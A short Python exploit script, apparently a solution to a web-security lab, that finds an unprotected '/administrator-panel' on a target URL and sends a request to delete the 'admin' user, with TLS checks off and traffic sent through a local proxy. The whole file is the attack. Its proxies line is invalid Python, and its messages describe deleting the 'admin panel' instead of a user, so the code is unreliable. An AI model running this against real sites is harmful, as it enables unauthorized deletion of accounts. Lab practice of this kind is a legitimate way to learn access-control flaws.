import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies=('http': 'http://localhost:8080','https': 'https://localhost:8080')

def delete_user(url):
      admin_panel_url=url+'/administrator-panel'
      r=requests.get(admin_panel_url,verify=False,proxies=proxies)
      if r.status_code==200:
            print("(+) Deleting admin panel...")
            delete_user=admin_panel_url+"/delete?username=admin"
            r=requests.get(delete_user,verify=False,proxies=proxies)
            if r.status_code==200:
                  print("(+) Admin panel deleted")
            else:
                  print("(-) Failed to delete admin panel")
      else:
                  print("(-) Failed to find admin panel")
def main():
      if len(sys.argv)!=2:
            print("(+) Usage: %s <url>"%sys.argv[0])
            print("(+) Example: %s www.example.com " % sys.argv[0])
            sys.exit(-1)
      url=sys.argv[1]
      print("(+) Finding admin panel...")
      delete_user(url)


if __name__ == '__main__':
      main()